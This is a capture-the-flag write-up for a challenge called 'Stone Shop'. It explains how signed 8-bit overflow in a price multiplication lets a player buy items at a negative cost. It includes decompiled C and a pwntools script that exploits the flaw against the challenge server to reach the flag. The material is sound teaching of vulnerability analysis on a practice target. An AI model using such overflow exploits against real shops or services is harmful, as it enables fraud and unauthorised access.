# Stone Shop: Integer Overflow in Signed Arithmetic  
**FesseMisk by HAL50000**

Standard integer overflow challenge. The shop uses signed 8-bit integers for everything, which means we can wrap the price calculation negative.

## The Vulnerability

All prices and coin counts are stored as `signed char` (8-bit, range -128 to 127). The multiplication happens without any overflow checks.

Looking at the decompilation, the key lines are:

```c
char var_9 = 0x64  // Starting coins: 100
char rax_4 = menu()
char rax_8 = var_10.b
char rax_10 = rax_8 * rax_4  // Overflow
if (rax_10 s> var_9) {
    puts("That's too expensive!");
} else {
    puts("Purchase successful!");
    var_9 -= rax_10;  // Subtracting negative = adding
}
```

The `char rax_10 = rax_8 * rax_4` line is where it breaks. No overflow checks, so `19 × 13 = 247` wraps to `-9` in signed 8-bit. The comparison passes, and `var_9 -= rax_10` becomes `100 - (-9) = 109`.

## The Exploit

Brick costs 13 coins. Buy 19 of them three times: `100 → 109 → 118 → 127` coins.

Buy Flagstone (120 coins) to trigger `print_flag()`.

## The Solve

```python
from pwn import *

p = remote('stoneshop.ept.gg', 1337, ssl=True)

# Buy Brick with quantity 19, three times
for _ in range(3):
    p.recvuntil(b'What do you want to buy [1/2/3/9]: ')
    p.sendline(b'1')
    p.recvuntil(b'How many do you want? ')
    p.sendline(b'19')
    p.recvuntil(b'Purchase successful!')

# Buy Flagstone
p.recvuntil(b'What do you want to buy [1/2/3/9]: ')
p.sendline(b'3')
p.sendline(b'1')
p.interactive()
```